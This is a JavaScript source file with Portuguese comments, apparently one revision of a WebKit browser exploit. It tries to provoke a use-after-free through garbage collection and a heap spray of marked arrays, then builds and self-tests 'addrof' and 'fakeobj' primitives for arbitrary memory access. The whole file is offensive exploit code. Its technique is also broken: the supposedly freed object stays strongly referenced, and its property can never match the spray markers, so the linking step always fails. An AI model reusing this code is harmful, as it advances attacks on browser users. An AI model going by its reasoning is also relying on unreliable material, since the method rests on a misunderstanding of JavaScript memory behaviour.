// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R63 - Correção de Vinculação de Referência)
// =======================================================================================
// O R62 FALHOU AO TENTAR VINCULAR a referência confusa ao array real.
// HIPÓTESE: Os offsets de escrita/leitura para propriedades nomeadas e indexadas são diferentes.
// ESTA VERSÃO IMPLEMENTA UMA NOVA TÉCNICA DE VINCULAÇÃO:
// - Os arrays na pulverização agora contêm valores únicos.
// - A verificação é feita por LEITURA: tentamos ler o valor único através da referência confusa.
// - Se a vinculação funcionar, as FASES de construção de primitivas serão executadas.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R63_Linker_Fix";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R63 - Linker Fix)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Correção de Vinculação (R63) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };

    try {
        // FASE 1: Provocar o UAF em um Array para obter nossa ferramenta de confusão.
        logS3("--- FASE 1: Provocando UAF em um Array 'Uncaged' ---", "subtest");
        const { leaker_obj, confused_arr } = await triggerUncagedArrayUAF();
        
        if (!leaker_obj || !confused_arr) {
            throw new Error("A rotina do UAF falhou em retornar os objetos de controle.");
        }
        logS3("++++++++++++ SUCESSO! UAF em Array Uncaged estável e vinculado! ++++++++++++", "vuln");

        // FASE 2: Construir e Testar as Primitivas Reais
        logS3("--- FASE 2: Forjando e Verificando Primitivas Reais ---", "subtest");
        
        function addrof(obj) {
            leaker_obj.p = obj;
            return doubleToInt64(confused_arr[0]);
        }

        function fakeobj(addr) {
            confused_arr[0] = int64ToDouble(addr);
            return leaker_obj.p;
        }
        
        logS3("    Primitivas 'addrof' e 'fakeobj' definidas. Iniciando auto-teste...", "info");

        const test_obj = { marker: 0x41414141 };
        logS3("    1. Obtendo endereço do objeto de teste...", "info");
        const test_addr = addrof(test_obj);
        logS3(`       Endereço vazado: ${test_addr.toString(true)}`, "leak");

        if (test_addr.low() === 0 && test_addr.high() === 0) {
            throw new Error("addrof retornou um endereço nulo.");
        }
        
        logS3("    2. Criando um objeto falso a partir do endereço vazado...", "info");
        const faked_obj = fakeobj(test_addr);

        logS3("    3. Verificando a integridade (test_obj === faked_obj)...", "info");
        if (faked_obj !== test_obj) {
            throw new Error("Auto-teste falhou: O objeto falsificado não é idêntico ao original.");
        }
        logS3("       Verificação de identidade: OK", "good");

        if (faked_obj.marker !== 0x41414141) {
            throw new Error("Auto-teste falhou: A propriedade do objeto falsificado não pôde ser lida.");
        }
        logS3("       Verificação de propriedade: OK", "good");

        logS3("++++++++++++ SUCESSO TOTAL! Primitivas 'addrof' e 'fakeobj' 100% funcionais! ++++++++++++", "vuln");

        final_result = { 
            success: true, 
            message: "Primitivas addrof/fakeobj forjadas e validadas com sucesso.",
            test_addr: test_addr.toString(true),
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result
    };
}


// --- Funções Auxiliares ---

async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) { /* ignora */ }
    await PAUSE_S3(500);
}

// R63: Retorna os dois objetos de controle após vinculá-los com sucesso.
async function triggerUncagedArrayUAF() {
    let leaker_obj = null;
    let confused_arr = null;

    function createDanglingPointer() {
        function createScope() {
            const victim_obj = { p: 0.0 }; // A propriedade 'p' será nosso alvo
            leaker_obj = victim_obj; 
        }
        createScope();
    }

    createDanglingPointer();
    
    await triggerGC_Tamed();

    // Pulverizamos a memória com ARRAYS contendo marcadores únicos.
    const spray_arrays = [];
    for (let i = 0; i < 2048; i++) {
        spray_arrays.push([0.1337 + i]); // Marcador único para cada array
    }
    
    // MUDANÇA R63: Nova lógica de vinculação por leitura
    logS3("    Procurando por array reutilizado via leitura de marcador...", "info");
    for (let i = 0; i < spray_arrays.length; i++) {
        const arr = spray_arrays[i];
        // Tentamos LER o valor do primeiro elemento do array através da propriedade 'p'
        if (leaker_obj.p === (0.1337 + i)) {
            confused_arr = arr;
            logS3(`    Array vinculado encontrado no índice ${i}!`, "good");
            break;
        }
    }
    
    if (!confused_arr) {
        throw new Error("Falha ao encontrar o array reutilizado na memória após o spray (verificação por leitura).");
    }

    return { leaker_obj, confused_arr };
}
